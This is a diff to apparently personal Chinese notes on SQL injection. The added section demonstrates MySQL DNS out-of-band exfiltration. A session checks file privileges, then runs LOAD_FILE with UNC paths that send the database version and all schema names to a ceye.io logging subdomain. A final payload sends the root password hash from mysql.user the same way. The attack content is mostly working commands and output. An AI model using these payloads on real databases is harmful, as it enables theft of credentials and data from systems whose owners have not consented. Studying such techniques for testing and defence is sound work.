@@ -1378,7 +1378,7 @@ Time: 0.012s
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202021155836.png)
 
->todo
+>todo tofinish
 
 - 写文件
 
@@ -1487,7 +1487,64 @@ Time: 0.008s
 |`\\system07\C$\`|The root directory of the C: drive on system07.|
 |`\\Server2\Share\Test\Foo.txt`|The Foo.txt file in the Test directory of the `\\Server2\Share volume`.|
 
+```
+MySQL root@localhost:(none)> select @@version;
++-----------+
+| @@version |
++-----------+
+| 5.5.44    |
++-----------+
+1 row in set
+Time: 0.016s
+MySQL root@localhost:(none)> show variables like "%file_priv";
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+1 row in set
+Time: 0.000s
+MySQL root@localhost:(none)> select file_priv,host,user from mysql.user;
++-----------+-----------+------+
+| file_priv | host      | user |
++-----------+-----------+------+
+| Y         | localhost | root |
+| Y         | 127.0.0.1 | root |
+| Y         | ::1       | root |
+| N         | localhost |      |
++-----------+-----------+------+
+4 rows in set
+Time: 0.000s
+```
 
+>注意`.ckr3de.ceye.io`最前面有一个`.`
+
+```
+MySQL root@localhost:(none)> SELECT LOAD_FILE(concat('\\\\',@@version,'.ckr3de.ceye.io\\abc'));
++------------------------------------------------------------+
+| LOAD_FILE(concat('\\\\',@@version,'.ckr3de.ceye.io\\abc')) |
++------------------------------------------------------------+
+| <null>                                                     |
++------------------------------------------------------------+
+1 row in set
+Time: 22.625s
+MySQL root@localhost:(none)> SELECT LOAD_FILE(concat('\\\\',(select group_concat(schema_name SEPARATOR '.') from information_schema.schemata),'.ckr3de.ceye.io\\abc'));
++------------------------------------------------------------------------------------------------------------------------------------+
+| LOAD_FILE(concat('\\\\',(select group_concat(schema_name SEPARATOR '.') from information_schema.schemata),'.ckr3de.ceye.io\\abc')) |
++------------------------------------------------------------------------------------------------------------------------------------+
+| <null>                                                                                                                             |
++------------------------------------------------------------------------------------------------------------------------------------+
+1 row in set
+Time: 22.297s
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202022158588.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202022155693.png)
+
+[官方payload](http://ceye.io/payloads)
+
+`SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));`
 
 ### 宽字节注入
 
